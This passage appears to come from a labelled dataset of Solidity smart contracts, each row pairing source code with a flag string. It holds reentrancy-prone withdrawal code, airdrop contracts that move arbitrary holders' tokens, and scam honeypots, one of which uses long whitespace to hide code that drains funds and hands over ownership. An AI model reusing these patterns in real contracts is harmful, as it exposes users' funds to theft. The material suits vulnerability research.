            if(Holders[_addr]>=_wei)

            {

                 
                _addr.call.value(_wei);

                Holders[_addr]-=_wei;

            }

        }

    }

    

    function Bal() public constant returns(uint){return this.balance;}

}",0000000000010000000010000
10019,0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859,"

 pragma solidity ^0.4.18;



contract MultiplicatorX4

{

    address public Owner = msg.sender;

   

    function() public payable{}

   

    function withdraw()

    payable

    public

    {

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

    

    function multiplicate(address adr)

    public

    payable

    {

        if(msg.value>=this.balance)

        {        

            adr.transfer(this.balance+msg.value);

        }

    }

}",0000000000000000000000000
10020,0x3f2ef511aa6e75231e4deafc7a3d2ecab3741de2,"

pragma solidity ^0.4.19;



contract WhaleGiveaway2

{

    address public Owner = msg.sender;

    uint constant public minEligibility = 0.999001 ether; 

   

    function()

    public

    payable

    {

        

    }

   

    function redeem()

    public

    payable

    {                                                                    

        if(msg.value>=minEligibility)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw()

    payable

    public

    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
10021,0x4051334adc52057aca763453820cb0e045076ef3," 



pragma solidity ^0.4.24;

 

contract airdrop{

    

    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i=0;i<_tos.length;i++){

              
            caddress.call(id,from,_tos[i],v);

        }

        return true;

    }

}",0100000000000000000001000
10022,0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1,"

 



pragma solidity ^0.4.19;



contract ACCURAL_DEPOSIT

{

    mapping (address=>uint256) public balances;   

   

    uint public MinSum = 1 ether;

    

    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        if(intitalized)revert();

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        if(intitalized)revert();

        Log = LogFile(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Deposit()

    public

    payable

    {

        balances[msg.sender]+= msg.value;

        Log.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                Log.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Deposit();

    }

    

}







contract LogFile

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000100000000001000000
10023,0x4a66ad0bca2d700f11e1f2fc2c106f7d3264504c,"

pragma solidity ^0.4.18;



contract EBU{

    address public from = 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9;

    address public caddress = 0x1f844685f7Bf86eFcc0e74D8642c54A257111923;

    

    function transfer(address[] _tos,uint[] v)public returns (bool){

        require(msg.sender == 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9);

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i=0;i<_tos.length;i++){

             
            caddress.call(id,from,_tos[i],v[i]*1000000000000000000);

        }

        return true;

    }

}",0100000100000000000001000
10024,0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152,"pragma solidity ^0.4.24;





contract airPort{

    

    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i=0;i<_tos.length;i++){

             
            caddress.call(id,from,_tos[i],v);

        }

        return true;

    }

}",0100000000000000000001000
10025,0x4e73b32ed6c35f570686b89848e5f39f20ecc106,"

pragma solidity ^0.4.19;



contract PRIVATE_ETH_CELL

{

    mapping (address=>uint256) public balances;   

   

    uint public MinSum;

    

    LogFile Log;

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        require(!intitalized);

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        require(!intitalized);

        Log = LogFile(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Deposit()

    public

    payable

    {

        balances[msg.sender]+= msg.value;

        Log.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                Log.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Deposit();

    }

    

}







contract LogFile

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10026,0x524960d55174d912768678d8c606b4d50b79d7b1," 



pragma solidity ^0.4.13;



contract Centra4 {



	function transfer() returns (bool) {	

		address contract_address;

		contract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;

		address c1;		

		address c2;

		uint256 k;

		k = 1;

		

		c2 = 0xaa27f8c1160886aacba64b2319d8d5469ef2af79;	

		 
		contract_address.call(""register"", ""CentraToken"");

		if(!contract_address.call(bytes4(keccak256(""transfer(address,uint256)"")),c2,k)) return false;



		return true;

	}



}",0000000100000000000000000
10027,0x52d2e0f9b01101a59b38a3d05c80b7618aeed984,"

pragma solidity ^0.4.19;

contract Token {

    function transfer(address _to, uint _value) returns (bool success);

    function balanceOf(address _owner) constant returns (uint balance);

}

contract EtherGet {

    address owner;

    function EtherGet() {

        owner = msg.sender;

    }

    function withdrawTokens(address tokenContract) public {

        Token tc = Token(tokenContract);

        tc.transfer(owner, tc.balanceOf(this));

    }

    function withdrawEther() public {

        owner.transfer(this.balance);

    }

    function getTokens(uint num, address addr) public {

        for(uint i = 0; i < num; i++){

             
            addr.call.value(0 wei)();

        }

    }

}",0001000000000000000010000
10028,0x561eac93c92360949ab1f1403323e6db345cbf31,"

pragma solidity ^0.4.19;



contract BANK_SAFE

{

    mapping (address=>uint256) public balances;   

   

    uint public MinSum;

    

    LogFile Log;

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        if(intitalized)throw;

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        if(intitalized)throw;

        Log = LogFile(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Deposit()

    public

    payable

    {

        balances[msg.sender]+= msg.value;

        Log.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                Log.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Deposit();

    }

    

}







contract LogFile

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000001010000
10029,0x5aa88d2901c68fda244f1d0584400368d2c8e739,"

pragma solidity ^0.4.18;



contract MultiplicatorX3

{

    address public Owner = msg.sender;

   

    function() public payable{}

   

    function withdraw()

    payable

    public

    {

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

    

    function multiplicate(address adr)

    public

    payable

    {

        if(msg.value>=this.balance)

        {        

            adr.transfer(this.balance+msg.value);

        }

    }

}",0000000000000000000000000
10030,0x610495793564aed0f9c7fc48dc4c7c9151d34fd6," 



pragma solidity ^0.4.24;





contract SimpleWallet {

    address public owner = msg.sender;

    uint public depositsCount;

    

    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }

    

    function() public payable {

        depositsCount++;

    }

    

    function withdrawAll() public onlyOwner {

        withdraw(address(this).balance);

    }

    

    function withdraw(uint _value) public onlyOwner {

        msg.sender.transfer(_value);

    }

    

    function sendMoney(address _target, uint _value, bytes _data) public onlyOwner {

         
        _target.call.value(_value)(_data);

    }

}",0000000000000000000000000
10031,0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839,"

pragma solidity ^0.4.19;



contract Ownable

{

    address newOwner;

    address owner = msg.sender;

    

    function changeOwner(address addr)

    public

    onlyOwner

    {

        newOwner = addr;

    }

    

    function confirmOwner() 

    public

    {

        if(msg.sender==newOwner)

        {

            owner=newOwner;

        }

    }

    

    modifier onlyOwner

    {

        if(owner == msg.sender)_;

    }

}



contract Token is Ownable

{

    address owner = msg.sender;

    function WithdrawToken(address token, uint256 amount,address to)

    public 

    onlyOwner

    {

          
        token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); 

    }

}



contract TokenBank is Token

{

    uint public MinDeposit;

    mapping (address => uint) public Holders;

    

      
    function initTokenBank()

    public

    {

        owner = msg.sender;

        MinDeposit = 1 ether;

    }

    

    function()

    payable

    {

        Deposit();

    }

   

    function Deposit() 

    payable

    {

        if(msg.value>MinDeposit)

        {

            Holders[msg.sender]+=msg.value;

        }

    }

    

    function WitdrawTokenToHolder(address _to,address _token,uint _amount)

    public

    onlyOwner

    {

        if(Holders[_to]>0)

        {

            Holders[_to]=0;

            WithdrawToken(_token,_amount,_to);     

        }

    }

   

    function WithdrawToHolder(address _addr, uint _wei) 

    public

    onlyOwner

    payable

    {

        if(Holders[_addr]>0)

        {

            if(_addr.call.value(_wei)())

            {

                Holders[_addr]-=_wei;

            }

        }

    }

}",0001000000000000000010000
10032,0x663e4229142a27f00bafb5d087e1e730648314c3,"

pragma solidity ^0.4.11;





contract ERC20 {

    function totalSupply() constant returns (uint supply);

    function balanceOf( address who ) constant returns (uint value);

    function allowance( address owner, address spender ) constant returns (uint _allowance);



    function transfer( address to, uint value) returns (bool ok);

    function transferFrom( address from, address to, uint value) returns (bool ok);

    function approve( address spender, uint value ) returns (bool ok);



    event Transfer( address indexed from, address indexed to, uint value);

    event Approval( address indexed owner, address indexed spender, uint value);

}

 

contract Ownable {

  address public owner;





   

  function Ownable() {

    owner = msg.sender;

  }





   

  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }





   

  function transferOwnership(address newOwner) onlyOwner {

    if (newOwner != address(0)) {

      owner = newOwner;

    }

  }



}



 
 
contract ERC721 {

     
    function totalSupply() public view returns (uint256 total);

    function balanceOf(address _owner) public view returns (uint256 balance);

    function ownerOf(uint256 _tokenId) external view returns (address owner);

    function approve(address _to, uint256 _tokenId) external;

    function transfer(address _to, uint256 _tokenId) external;

    function transferFrom(address _from, address _to, uint256 _tokenId) external;



     
    event Transfer(address from, address to, uint256 tokenId);

    event Approval(address owner, address approved, uint256 tokenId);



     
     
     
     
     


     
    function supportsInterface(bytes4 _interfaceID) external view returns (bool);

}



contract GeneScienceInterface {

     
    function isGeneScience() public pure returns (bool);



     
     
     
     
    function mixGenes(uint256[2] genes1, uint256[2] genes2,uint256 g1,uint256 g2, uint256 targetBlock) public returns (uint256[2]);



    function getPureFromGene(uint256[2] gene) public view returns(uint256);



     
    function getSex(uint256[2] gene) public view returns(uint256);



     
    function getWizzType(uint256[2] gene) public view returns(uint256);



    function clearWizzType(uint256[2] _gene) public returns(uint256[2]);

}



 
 
 
contract PandaAccessControl {

     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     


     
    event ContractUpgrade(address newContract);



     
    address public ceoAddress;

    address public cfoAddress;

    address public cooAddress;



     
    bool public paused = false;



     
    modifier onlyCEO() {

        require(msg.sender == ceoAddress);

        _;

    }



     
    modifier onlyCFO() {

        require(msg.sender == cfoAddress);

        _;

    }



     
    modifier onlyCOO() {

        require(msg.sender == cooAddress);

        _;

    }



    modifier onlyCLevel() {

        require(

            msg.sender == cooAddress ||

            msg.sender == ceoAddress ||

            msg.sender == cfoAddress

        );

        _;

    }



     
     
    function setCEO(address _newCEO) external onlyCEO {

        require(_newCEO != address(0));



        ceoAddress = _newCEO;

    }



     
     
    function setCFO(address _newCFO) external onlyCEO {

        require(_newCFO != address(0));



        cfoAddress = _newCFO;

    }



     
     
    function setCOO(address _newCOO) external onlyCEO {

        require(_newCOO != address(0));



        cooAddress = _newCOO;

    }



     



     
    modifier whenNotPaused() {

        require(!paused);

        _;

    }



     
    modifier whenPaused {

        require(paused);

        _;

    }



     
     
    function pause() external onlyCLevel whenNotPaused {

        paused = true;

    }



     
     
     
     
     
    function unpause() public onlyCEO whenPaused {

         
        paused = false;

    }

}

















 
 
 
contract PandaBase is PandaAccessControl {

     



    uint256 public constant GEN0_TOTAL_COUNT = 16200;

    uint256 public gen0CreatedCount;



     
     
     
    event Birth(address owner, uint256 pandaId, uint256 matronId, uint256 sireId, uint256[2] genes);



     
     
    event Transfer(address from, address to, uint256 tokenId);



     



     
     
     
     
    struct Panda {

         
         
        uint256[2] genes;



         
        uint64 birthTime;



         
         
         
        uint64 cooldownEndBlock;



         
         
         
         
         
         
        uint32 matronId;

        uint32 sireId;



         
         
         
         
        uint32 siringWithId;



         
         
         
         
         
        uint16 cooldownIndex;



         
         
         
         
         
        uint16 generation;

    }



     



     
     
     
     
     
     
    uint32[9] public cooldowns = [

        uint32(5 minutes),

        uint32(30 minutes),

        uint32(2 hours),

        uint32(4 hours),    

        uint32(8 hours),

        uint32(24 hours),

        uint32(48 hours),

        uint32(72 hours),

        uint32(7 days)

    ];



     
    uint256 public secondsPerBlock = 15;



     



     
     
     
     
     
    Panda[] pandas;



     
     
    mapping (uint256 => address) public pandaIndexToOwner;



     
     
    mapping (address => uint256) ownershipTokenCount;



     
     
     
    mapping (uint256 => address) public pandaIndexToApproved;



     
     
     
    mapping (uint256 => address) public sireAllowedToAddress;



     
     
     
    SaleClockAuction public saleAuction;



     
     
     
    SiringClockAuction public siringAuction;





     
     
    GeneScienceInterface public geneScience;





    SaleClockAuctionERC20 public saleAuctionERC20;





     
    mapping (uint256 => uint256) public wizzPandaQuota;

    mapping (uint256 => uint256) public wizzPandaCount;



    

     
    function getWizzPandaQuotaOf(uint256 _tp) view external returns(uint256) {

        return wizzPandaQuota[_tp];

    }



    function getWizzPandaCountOf(uint256 _tp) view external returns(uint256) {

        return wizzPandaCount[_tp];

    }



    function setTotalWizzPandaOf(uint256 _tp,uint256 _total) external onlyCLevel {

        require (wizzPandaQuota[_tp]==0);

        require (_total==uint256(uint32(_total)));

        wizzPandaQuota[_tp] = _total;

    }



    function getWizzTypeOf(uint256 _id) view external returns(uint256) {

        Panda memory _p = pandas[_id];

        return geneScience.getWizzType(_p.genes);

    }



     
    function _transfer(address _from, address _to, uint256 _tokenId) internal {

         
        ownershipTokenCount[_to]++;

         
        pandaIndexToOwner[_tokenId] = _to;

         
        if (_from != address(0)) {

            ownershipTokenCount[_from]--;

             
            delete sireAllowedToAddress[_tokenId];

             
            delete pandaIndexToApproved[_tokenId];

        }

         
        Transfer(_from, _to, _tokenId);

    }



     
     
     
     
     
     
     
     
     
    function _createPanda(

        uint256 _matronId,

        uint256 _sireId,

        uint256 _generation,

        uint256[2] _genes,

        address _owner

    )

        internal

        returns (uint)

    {

         
         
         
         
        require(_matronId == uint256(uint32(_matronId)));

        require(_sireId == uint256(uint32(_sireId)));

        require(_generation == uint256(uint16(_generation)));





         
        uint16 cooldownIndex = 0;

         
        if (pandas.length>0){

            uint16 pureDegree = uint16(geneScience.getPureFromGene(_genes));

            if (pureDegree==0) {

                pureDegree = 1;

            }

            cooldownIndex = 1000/pureDegree;

            if (cooldownIndex%10 < 5){

                cooldownIndex = cooldownIndex/10;

            }else{

                cooldownIndex = cooldownIndex/10 + 1;

            }

            cooldownIndex = cooldownIndex - 1;

            if (cooldownIndex > 8) {

                cooldownIndex = 8;

            }

            uint256 _tp = geneScience.getWizzType(_genes);

            if (_tp>0 && wizzPandaQuota[_tp]<=wizzPandaCount[_tp]) {

                _genes = geneScience.clearWizzType(_genes);

                _tp = 0;

            }

             
            if (_tp == 1){

                cooldownIndex = 5;

            }



             
            if (_tp>0){

                wizzPandaCount[_tp] = wizzPandaCount[_tp] + 1;

            }

             
            if (_generation <= 1 && _tp != 1){

                require(gen0CreatedCount<GEN0_TOTAL_COUNT);

                gen0CreatedCount++;

            }

        }



        Panda memory _panda = Panda({

            genes: _genes,

            birthTime: uint64(now),

            cooldownEndBlock: 0,

            matronId: uint32(_matronId),

            sireId: uint32(_sireId),

            siringWithId: 0,

            cooldownIndex: cooldownIndex,

            generation: uint16(_generation)

        });

        uint256 newKittenId = pandas.push(_panda) - 1;



         
         
        require(newKittenId == uint256(uint32(newKittenId)));



         
        Birth(

            _owner,

            newKittenId,

            uint256(_panda.matronId),

            uint256(_panda.sireId),

            _panda.genes

        );



         
         
        _transfer(0, _owner, newKittenId);

        

        return newKittenId;

    }



     
    function setSecondsPerBlock(uint256 secs) external onlyCLevel {

        require(secs < cooldowns[0]);

        secondsPerBlock = secs;

    }

}

 
 
contract ERC721Metadata {

     
    function getMetadata(uint256 _tokenId, string) public view returns (bytes32[4] buffer, uint256 count) {

        if (_tokenId == 1) {

            buffer[0] = ""Hello World! :D"";

            count = 15;

        } else if (_tokenId == 2) {

            buffer[0] = ""I would definitely choose a medi"";

            buffer[1] = ""um length string."";

            count = 49;

        } else if (_tokenId == 3) {

            buffer[0] = ""Lorem ipsum dolor sit amet, mi e"";

            buffer[1] = ""st accumsan dapibus augue lorem,"";

            buffer[2] = "" tristique vestibulum id, libero"";

            buffer[3] = "" suscipit varius sapien aliquam."";

            count = 128;

        }

    }

}















 
 
 
 
contract PandaOwnership is PandaBase, ERC721 {



     
    string public constant name = ""PandaEarth"";

    string public constant symbol = ""PE"";



    bytes4 constant InterfaceSignature_ERC165 =

        bytes4(keccak256('supportsInterface(bytes4)'));



    bytes4 constant InterfaceSignature_ERC721 =

        bytes4(keccak256('name()')) ^

        bytes4(keccak256('symbol()')) ^

        bytes4(keccak256('totalSupply()')) ^

        bytes4(keccak256('balanceOf(address)')) ^

        bytes4(keccak256('ownerOf(uint256)')) ^

        bytes4(keccak256('approve(address,uint256)')) ^

        bytes4(keccak256('transfer(address,uint256)')) ^

        bytes4(keccak256('transferFrom(address,address,uint256)')) ^

        bytes4(keccak256('tokensOfOwner(address)')) ^

        bytes4(keccak256('tokenMetadata(uint256,string)'));



     
     
     
    function supportsInterface(bytes4 _interfaceID) external view returns (bool)

    {

         
         


        return ((_interfaceID == InterfaceSignature_ERC165) || (_interfaceID == InterfaceSignature_ERC721));

    }



     
     
     


     
     
     
    function _owns(address _claimant, uint256 _tokenId) internal view returns (bool) {

        return pandaIndexToOwner[_tokenId] == _claimant;

    }



     
     
     
    function _approvedFor(address _claimant, uint256 _tokenId) internal view returns (bool) {

        return pandaIndexToApproved[_tokenId] == _claimant;

    }



     
     
     
     
     
    function _approve(uint256 _tokenId, address _approved) internal {

        pandaIndexToApproved[_tokenId] = _approved;

    }



     
     
     
    function balanceOf(address _owner) public view returns (uint256 count) {

        return ownershipTokenCount[_owner];

    }



     
     
     
     
     
     
    function transfer(

        address _to,

        uint256 _tokenId

    )

        external

        whenNotPaused

    {

         
        require(_to != address(0));

         
         
         
        require(_to != address(this));

         
         
         
        require(_to != address(saleAuction));

        require(_to != address(siringAuction));



         
        require(_owns(msg.sender, _tokenId));



         
        _transfer(msg.sender, _to, _tokenId);

    }



     
     
     
     
     
     
    function approve(

        address _to,

        uint256 _tokenId

    )

        external

        whenNotPaused

    {

         
        require(_owns(msg.sender, _tokenId));



         
        _approve(_tokenId, _to);



         
        Approval(msg.sender, _to, _tokenId);

    }



     
     
     
     
     
     
     
    function transferFrom(

        address _from,

        address _to,

        uint256 _tokenId

    )

        external

        whenNotPaused

    {

         
        require(_to != address(0));

         
         
         
        require(_to != address(this));

         
        require(_approvedFor(msg.sender, _tokenId));

        require(_owns(_from, _tokenId));



         
        _transfer(_from, _to, _tokenId);

    }



     
     
    function totalSupply() public view returns (uint) {

        return pandas.length - 1;

    }



     
     
    function ownerOf(uint256 _tokenId)

        external

        view

        returns (address owner)

    {

        owner = pandaIndexToOwner[_tokenId];



        require(owner != address(0));

    }



     
     
     
     
     
     
    function tokensOfOwner(address _owner) external view returns(uint256[] ownerTokens) {

        uint256 tokenCount = balanceOf(_owner);



        if (tokenCount == 0) {

             
            return new uint256[](0);

        } else {

            uint256[] memory result = new uint256[](tokenCount);

            uint256 totalCats = totalSupply();

            uint256 resultIndex = 0;



             
             
            uint256 catId;



            for (catId = 1; catId <= totalCats; catId++) {

                if (pandaIndexToOwner[catId] == _owner) {

                    result[resultIndex] = catId;

                    resultIndex++;

                }

            }



            return result;

        }

    }



     
     
     
    function _memcpy(uint _dest, uint _src, uint _len) private view {

         
        for(; _len >= 32; _len -= 32) {

            assembly {

                mstore(_dest, mload(_src))

            }

            _dest += 32;

            _src += 32;

        }



         
        uint256 mask = 256 ** (32 - _len) - 1;

        assembly {

            let srcpart := and(mload(_src), not(mask))

            let destpart := and(mload(_dest), mask)

            mstore(_dest, or(destpart, srcpart))

        }

    }



     
     
     
    function _toString(bytes32[4] _rawBytes, uint256 _stringLength) private view returns (string) {

        var outputString = new string(_stringLength);

        uint256 outputPtr;

        uint256 bytesPtr;



        assembly {

            outputPtr := add(outputString, 32)

            bytesPtr := _rawBytes

        }



        _memcpy(outputPtr, bytesPtr, _stringLength);



        return outputString;

    }



}









 
 
 
contract PandaBreeding is PandaOwnership {



    uint256 public constant GENSIS_TOTAL_COUNT = 100;



     
     
    event Pregnant(address owner, uint256 matronId, uint256 sireId, uint256 cooldownEndBlock);

     
    event Abortion(address owner, uint256 matronId, uint256 sireId);



     
     
     
    uint256 public autoBirthFee = 2 finney;



     
    uint256 public pregnantPandas;



    mapping(uint256 => address) childOwner;





     
     
    function setGeneScienceAddress(address _address) external onlyCEO {

        GeneScienceInterface candidateContract = GeneScienceInterface(_address);



         
        require(candidateContract.isGeneScience());



         
        geneScience = candidateContract;

    }



     
     
     
    function _isReadyToBreed(Panda _kit) internal view returns(bool) {

         
         
         
        return (_kit.siringWithId == 0) && (_kit.cooldownEndBlock <= uint64(block.number));

    }



     
     
     
    function _isSiringPermitted(uint256 _sireId, uint256 _matronId) internal view returns(bool) {

        address matronOwner = pandaIndexToOwner[_matronId];

        address sireOwner = pandaIndexToOwner[_sireId];



         
         
        return (matronOwner == sireOwner || sireAllowedToAddress[_sireId] == matronOwner);

    }



     
     
     
    function _triggerCooldown(Panda storage _kitten) internal {

         
        _kitten.cooldownEndBlock = uint64((cooldowns[_kitten.cooldownIndex] / secondsPerBlock) + block.number);





         
         
         
        if (_kitten.cooldownIndex < 8 && geneScience.getWizzType(_kitten.genes) != 1) {

            _kitten.cooldownIndex += 1;

        }

    }



     
     
     
     
    function approveSiring(address _addr, uint256 _sireId)

    external

    whenNotPaused {

        require(_owns(msg.sender, _sireId));

        sireAllowedToAddress[_sireId] = _addr;

    }



     
     
     
    function setAutoBirthFee(uint256 val) external onlyCOO {

        autoBirthFee = val;

    }



     
     
    function _isReadyToGiveBirth(Panda _matron) private view returns(bool) {

        return (_matron.siringWithId != 0) && (_matron.cooldownEndBlock <= uint64(block.number));

    }



     
     
     
    function isReadyToBreed(uint256 _pandaId)

    public

    view

    returns(bool) {

        require(_pandaId > 0);

        Panda storage kit = pandas[_pandaId];

        return _isReadyToBreed(kit);

    }



     
     
    function isPregnant(uint256 _pandaId)

    public

    view

    returns(bool) {

        require(_pandaId > 0);

         
        return pandas[_pandaId].siringWithId != 0;

    }



     
     
     
     
     
     
    function _isValidMatingPair(

        Panda storage _matron,

        uint256 _matronId,

        Panda storage _sire,

        uint256 _sireId

    )

    private

    view

    returns(bool) {

         
        if (_matronId == _sireId) {

            return false;

        }



         
        if (_matron.matronId == _sireId || _matron.sireId == _sireId) {

            return false;

        }

        if (_sire.matronId == _matronId || _sire.sireId == _matronId) {

            return false;

        }



         
         
        if (_sire.matronId == 0 || _matron.matronId == 0) {

            return true;

        }



         
        if (_sire.matronId == _matron.matronId || _sire.matronId == _matron.sireId) {

            return false;

        }

        if (_sire.sireId == _matron.matronId || _sire.sireId == _matron.sireId) {

            return false;

        }



         
        if (geneScience.getSex(_matron.genes) + geneScience.getSex(_sire.genes) != 1) {

            return false;

        }



         
        return true;

    }



     
     
    function _canBreedWithViaAuction(uint256 _matronId, uint256 _sireId)

    internal

    view

    returns(bool) {

        Panda storage matron = pandas[_matronId];

        Panda storage sire = pandas[_sireId];

        return _isValidMatingPair(matron, _matronId, sire, _sireId);

    }



     
     
     
     
     
     
    function canBreedWith(uint256 _matronId, uint256 _sireId)

    external

    view

    returns(bool) {

        require(_matronId > 0);

        require(_sireId > 0);

        Panda storage matron = pandas[_matronId];

        Panda storage sire = pandas[_sireId];

        return _isValidMatingPair(matron, _matronId, sire, _sireId) &&

            _isSiringPermitted(_sireId, _matronId);

    }



    function _exchangeMatronSireId(uint256 _matronId, uint256 _sireId) internal returns(uint256, uint256) {

        if (geneScience.getSex(pandas[_matronId].genes) == 1) {

            return (_sireId, _matronId);

        } else {

            return (_matronId, _sireId);

        }

    }



     
     
    function _breedWith(uint256 _matronId, uint256 _sireId, address _owner) internal {

         
        (_matronId, _sireId) = _exchangeMatronSireId(_matronId, _sireId);

         
        Panda storage sire = pandas[_sireId];

        Panda storage matron = pandas[_matronId];



         
        matron.siringWithId = uint32(_sireId);



         
        _triggerCooldown(sire);

        _triggerCooldown(matron);



         
         
        delete sireAllowedToAddress[_matronId];

        delete sireAllowedToAddress[_sireId];



         
        pregnantPandas++;



        childOwner[_matronId] = _owner;



         
        Pregnant(pandaIndexToOwner[_matronId], _matronId, _sireId, matron.cooldownEndBlock);

    }



     
     
     
     
     
    function breedWithAuto(uint256 _matronId, uint256 _sireId)

    external

    payable

    whenNotPaused {

         
        require(msg.value >= autoBirthFee);



         
        require(_owns(msg.sender, _matronId));



         
         
         
         
         
         
         
         
         
         


         
         
         
        require(_isSiringPermitted(_sireId, _matronId));



         
        Panda storage matron = pandas[_matronId];



         
        require(_isReadyToBreed(matron));



         
        Panda storage sire = pandas[_sireId];



         
        require(_isReadyToBreed(sire));



         
        require(_isValidMatingPair(

            matron,

            _matronId,

            sire,

            _sireId

        ));



         
        _breedWith(_matronId, _sireId, msg.sender);

    }



     
     
     
     
     
     
     
     
    function giveBirth(uint256 _matronId, uint256[2] _childGenes, uint256[2] _factors)

    external

    whenNotPaused

    onlyCLevel

    returns(uint256) {

         
        Panda storage matron = pandas[_matronId];



         
        require(matron.birthTime != 0);



         
        require(_isReadyToGiveBirth(matron));



         
        uint256 sireId = matron.siringWithId;

        Panda storage sire = pandas[sireId];



         
        uint16 parentGen = matron.generation;

        if (sire.generation > matron.generation) {

            parentGen = sire.generation;

        }



         
         
        uint256[2] memory childGenes = _childGenes;



        uint256 kittenId = 0;



         
        uint256 probability = (geneScience.getPureFromGene(matron.genes) + geneScience.getPureFromGene(sire.genes)) / 2 + _factors[0];

        if (probability >= (parentGen + 1) * _factors[1]) {

            probability = probability - (parentGen + 1) * _factors[1];

        } else {

            probability = 0;

        }

        if (parentGen == 0 && gen0CreatedCount == GEN0_TOTAL_COUNT) {

            probability = 0;

        }

        if (uint256(keccak256(block.blockhash(block.number - 2), now)) % 100 < probability) {

             
            address owner = childOwner[_matronId];

            kittenId = _createPanda(_matronId, matron.siringWithId, parentGen + 1, childGenes, owner);

        } else {

            Abortion(pandaIndexToOwner[_matronId], _matronId, sireId);

        }

         
         
         
